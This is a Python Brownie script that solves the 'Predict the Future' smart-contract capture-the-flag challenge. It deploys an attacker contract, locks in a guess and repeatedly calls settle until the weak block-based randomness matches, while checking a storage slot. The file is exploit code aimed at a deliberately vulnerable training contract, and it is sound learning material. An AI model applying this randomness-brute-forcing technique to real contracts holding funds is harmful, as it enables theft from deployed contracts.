from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import PredictTheFutureChallenge, PredictTheFutureAttack

##########################################
# This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        predict_the_future = load_challenge(ContractObject=PredictTheFutureChallenge, instance_key='predict_the_future')
    else:
        predict_the_future = deploy_locally(ContractObject=PredictTheFutureChallenge, from_account=_from | {'value':1e18})

    # # deploy attacker contract
    attacker = PredictTheFutureAttack.deploy(predict_the_future.address, _from)

    # make the guess to set `guesser` as my address
    tx = attacker.makeGuess(_from | {'value':1e18})

    # wait for two confirmations
    tx.wait(2)

    # call settle until it works, because `guess` is already 0
    while True:
        # check if the challenge is completed
        result = predict_the_future.isComplete()
        print(f'The challenge is complete: {result}')
        if result:
            break
        
        # call settle
        try:
            attacker.callSettle(_from | {'allow_revert':True})
        except:
            pass

        # check if the guesser has been overwritten
        guesser = web3.eth.get_storage_at(predict_the_future.address, '0x').hex()
        print(f'The guesser is: {guesser}')
        if attacker.address[-40:].upper() != guesser[-40:].upper():
            print('guesser has been overwritten')
            break

    # return the result
    return result

def main():
    solve_challenge(False)
